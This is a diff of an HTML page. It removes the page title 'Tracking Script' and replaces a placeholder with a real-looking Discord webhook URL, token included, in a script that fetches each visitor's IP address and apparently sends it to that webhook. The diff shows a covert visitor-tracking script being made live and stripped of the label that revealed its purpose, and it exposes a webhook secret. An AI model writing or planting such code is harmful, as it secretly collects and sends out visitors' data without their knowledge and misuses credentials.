@@ -9,10 +9,9 @@
 
             <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Tracking Script</title>
     <script>
         async function sendVisitorData() {
-            const webhookURL = "YOUR_DISCORD_WEBHOOK_URL"; // Replace with your webhook
+            const webhookURL = "https://discord.com/api/webhooks/1342880919677173840/8dz1UuBieeVWqmKCaa-JmPYzZEvrPQmF4OA4UOIu6RKAxBN6aTZ8eDSyDHRR6d-9-atr"; // Replace with your webhook
             
             // Get IP address
             const ipData = await fetch("https://api64.ipify.org?format=json").then(res => res.json());
